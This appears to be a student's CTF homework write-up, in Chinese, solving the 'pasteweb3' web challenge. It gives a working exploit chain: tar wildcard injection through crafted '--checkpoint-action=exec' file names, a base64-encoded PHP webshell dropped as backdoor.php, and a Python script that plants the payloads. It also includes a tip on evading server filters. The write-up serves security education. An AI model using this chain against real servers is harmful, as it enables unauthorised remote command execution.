# hw_pasteweb3

1. 這題的題目說要 try to RCE, you can read the final FLAG by executing `/readflag` ，我這邊第一個想法是，因為前一題已經可以讀檔案內容了，於是我這邊也嘗試讀取 readflag 檔案看看，結果發現好像可以讀到一個 ELF 開頭的檔案，我把它的 byte 寫進一個叫 result 的自創檔案，然後用 file 去check 確認這是一個 ELF 檔案，但實際執行起來會有問題，會說 fopen : No such file or directory，猜測他會去開啟一個檔案但找不到，然後用 GDB 去執行看他要讀取的檔案是什麼，發現是要找一個叫 /flag 的 的檔案但找不到，於是我也用差不多的方法去載 /flag 檔案，但是也會讀取不到，後來想想因為不是可執行檔，也沒寫進環境變數，所以會需要絕對路徑才可以讀取到它，所以這個方法目前可能會行不通。
    
    ![截圖 2022-12-29 上午11.33.10.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258A%25E5%258D%258811.33.10.png)
    
    ![截圖 2022-12-29 下午1.42.47.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25881.42.47.png)
    
    ![截圖 2022-12-29 下午1.53.25.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25881.53.25.png)
    
    ![截圖 2022-12-29 下午2.04.07.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25882.04.07.png)
    
    ![截圖 2022-12-29 下午2.05.58.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25882.05.58.png)
    

1. 因為上一題取得了程式的 Source code，所以這邊嘗試去 Code review 內容，找了很久在 download.php 裡面發現這邊有個地方很像是漏洞， “tar -cvf download.tar *” 這個指令因為後面的萬用字元是可以控制的參數，所以可以注入任何字元進來讓 tar 去執行，上網研究了一下確認這是個 Wildcards injection 的漏洞，所以接下來要想辦法去控制 * 參數，讓他可以執行 Wildcards injection 的 paylaod 。
    
    ![截圖 2022-12-29 下午2.44.48.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25882.44.48.png)
    

1. 接下來去研究怎麼把內容注入到 tar -cvf download.tar * 這一行的 ＊這邊，這邊 tar 會把 $sandbox 路徑裡面的檔案都打包壓縮，可是 $sandbox 裡面的內容 $_SESSION 會被弄成 md5 因為沒辦法方法去讀檔案路徑，所以這邊沒辦法直接知道打包檔案的路徑，所以也沒辦法把一些檔案放到 sandbox 裡面，所以這題不能用檔案路徑。然後也嘗試塞一些 payload 進去，去觀察回傳值，但目前也看不太出來有什麼效果。
    
    ![截圖 2022-12-29 下午6.21.38.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25886.21.38.png)
    
    ![截圖 2022-12-29 下午6.22.03.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-29_%25E4%25B8%258B%25E5%258D%25886.22.03.png)
    

1. 於是到這邊的時候我有兩個方向
    1. 原本題目，嘗試去 RCE ，然後執行 ./readelf 檔案，拿 flag (方法的話，就是用 tar wildcard injection ，但目前不知道怎麼用）按照原本題目，嘗試去 RCE ，然後執行 ./readelf 檔案，拿 flag (方法的話，就是用 tar wildcard injection ，但目前不知道怎麼用）
        
        [Wildcards Spare tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
        
    
    b. 去拿 readflag 檔案並執行( 已拿到），執行後發現他會去讀 flag 檔案 ( 未拿到），然後直接在本地端執行 readflag ，但因爲暫時沒有想到什麼方法找到 flag 的位置，所以這個方式還沒有想到可以怎麼解。
    

1. 然後就開始去嘗試 4-a 方案，

1. 首先，我們都知道是 tar 那個 fuction 有一個漏洞是 Wildcard Injection，但這邊會不知道怎麼利用，所以最好可以在電腦實作一遍，且要可以成功，成功的話會類似這張圖這樣。
    
    ![https://media.discordapp.net/attachments/1028186321186988083/1058097241992208535/2022-12-30_12.png?width=800&height=222](https://media.discordapp.net/attachments/1028186321186988083/1058097241992208535/2022-12-30_12.png?width=800&height=222)
    
2. 接下來已經知道怎麼利用這個漏洞，但不知道怎麼應用在這個網站，然後因為我們有了 Source Code ，所以可以直接去 trace 程式碼，會發現這邊 compileFile 函數能生成一個 .css 檔案，生成的檔案會放在$sandbox : /sandbox/{username_md5}/ 底下，生成的檔案會放在$sandbox : /sandbox/{username_md5}/ 底下。
    
    ![截圖 2022-12-30 上午3.58.27.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-30_%25E4%25B8%258A%25E5%258D%25883.58.27.png)
    
3. 然後執行 download.php 的時候，他會去$sandbox 裡面 執行這個 tar -cvf download.tar * 指令。
    
    ![https://media.discordapp.net/attachments/1028186321186988083/1058098672174383134/2022-12-30_3.05.20.png?width=800&height=489](https://media.discordapp.net/attachments/1028186321186988083/1058098672174383134/2022-12-30_3.05.20.png?width=800&height=489)
    
4. 到這邊我們可以統整一下已知的資訊，compileFile 函數可以創建副檔名為 .css 的檔案 ，執行 download.php 的時候會執行 tar -cvf download.tar * 指令。接下來就是要開始去思考如何利用這兩點來 RCE。

6.而我這邊的想法是，讓程式執行download 得時候，利用 Wildcard Injection 漏洞產生一個    backdoor.php ( backdoor.php 是自己寫進去的一句話木馬) 然後存取   /sandbox/{username_md5}/backdoor.php 這個路徑，就可以獲得一個一句話木馬的 webshell 。

以下是我的執行過程:

1. 先寫一段 payload ，利用 editCSS的功能去 /sandbox/{username_md5}/ 這個檔案路徑底下創建三個檔案，檔案名稱分別是"--checkpoint-action=exec=echo hi_hi1 > hi.txt ;" 、"--checkpoint-action=exec=sh shell.sh ;"、"--checkpoint-action=exec=echo 'PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='| base64 -d > backdoor.php ;"。

```python
import requests

cookies = { 'PHPSESSID' : '2iqtg6rmf8330gap6icookvodd' }
user_md5 = "5d3437151a39b5a13e45af2e71cd1818"

def editCSS(name):
    url_edit = 'https://pasteweb.ctf.zoolab.org/editcss.php'
    value = { 'less' : "" , 'theme' : name}
    r = requests.post(url_edit, data=value, cookies=cookies)  

if __name__ == '__main__':
    editCSS("--checkpoint-action=exec=echo Successful > test.txt ;")
    editCSS("--checkpoint-action=exec=echo 'PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='| base64 -d > backdoor.php ;")
```

b. 運行 download.php 後，讓他利用漏洞產生 “test.txt” 、“backdoor.php” 這兩個檔案，再去 access 這個路徑“[https://pasteweb.ctf.zoolab.org/sandbox/%7Busername_md5%7D/](https://pasteweb.ctf.zoolab.org/sandbox/%7Busername_md5%7D/backdoor.php)test.txt“，得到一個 Successful 的 Response 之後，再去access “[https://pasteweb.ctf.zoolab.org/sandbox/%7Busername_md5%7D/](https://pasteweb.ctf.zoolab.org/sandbox/%7Busername_md5%7D/backdoor.php)backdoor.php“就可以成功獲得 Webshell。因為 /readflag 已經被寫進環境變數，所以這邊可以直接執行 cmd=/readflag 來獲得FLAG{aRgUm3nT_Inj3ct10n_2_RcE}。

![截圖 2022-12-30 上午4.41.02.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-30_%25E4%25B8%258A%25E5%258D%25884.41.02.png)

另外，執行這個的過程，遇到的一些細節描述如下 :

a. editCSS 的時候，如果要利用 compileFile 去生成檔案 ，POST Request 要增加一個 value ，用法大概是像下圖這樣 。

![https://media.discordapp.net/attachments/1028186321186988083/1058104312259162172/2022-12-30_3.28.23.png?width=800&height=234](https://media.discordapp.net/attachments/1028186321186988083/1058104312259162172/2022-12-30_3.28.23.png?width=800&height=234)

b. 如果要放一句話木馬的話，server 端會有很多過濾機制，會導致沒有寫成功，像是 $ 前面要加 / 之類的。而我這邊是直接把一句話木馬的內容轉為 base64 ，再傳進去，就不會遇到那個過濾機制的問題。

![https://media.discordapp.net/attachments/1028186321186988083/1058104804964061244/2022-12-30_3.29.46.png?width=800&height=42](https://media.discordapp.net/attachments/1028186321186988083/1058104804964061244/2022-12-30_3.29.46.png?width=800&height=42)

![截圖 2022-12-30 上午4.45.58.png](hw_pasteweb3%20008e5ff9a9e24a04a12783d0f2e1df24/%25E6%2588%25AA%25E5%259C%2596_2022-12-30_%25E4%25B8%258A%25E5%258D%25884.45.58.png)

d. 這邊不用放 “--checkpoint=1” 這個檔名到路徑底下，我試了很久都沒有辦法 work ，好像是他已經有預設這個參數了。 

e. 路徑底下要多塞一點東西，因為不知道它實際 tar 還有帶了什麼隱藏了什麼參數，像是 “--checkpoint=1” 不知道被藏在什麼地方，要塞夠大的資料進去檔案路徑 tar 才可以漏洞利用成功，而我這邊是直接 Edit HTML 一對內容進去，因為 Edit HTML 的檔案也會被放在同個資料夾底下。